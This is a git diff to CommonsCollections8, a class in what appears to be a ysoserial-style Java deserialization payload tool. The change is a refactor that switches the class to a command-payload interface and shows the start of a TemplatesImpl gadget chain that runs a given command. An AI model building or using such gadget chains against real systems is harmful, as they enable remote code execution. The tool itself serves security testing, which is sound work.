@@ -7,7 +7,7 @@ import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -15,7 +15,8 @@ import com.h2tg.ysogate.utils.Reflections;
 
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({"navalorenzo"})
-public class CommonsCollections8 implements ObjectPayload<TreeBag> {
+public class CommonsCollections8 implements CommandObjectPayload<TreeBag>
+{
 
 	public TreeBag getObject(String command) throws Exception {
 		Object                 templates   = Gadgets.createTemplatesImpl(command);
